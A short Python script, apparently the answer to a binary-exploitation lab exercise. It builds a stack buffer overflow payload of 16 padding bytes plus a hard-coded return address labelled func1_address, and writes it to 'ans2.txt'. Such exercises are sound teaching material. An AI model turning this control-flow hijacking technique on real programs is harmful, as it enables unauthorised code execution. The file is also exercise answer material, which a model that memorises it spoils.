padding = b"A" * 16
func1_address = b"\x4c\x12\x40\x00\x00\x00\x00\x00"  
payload = padding+ func1_address
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2.txt")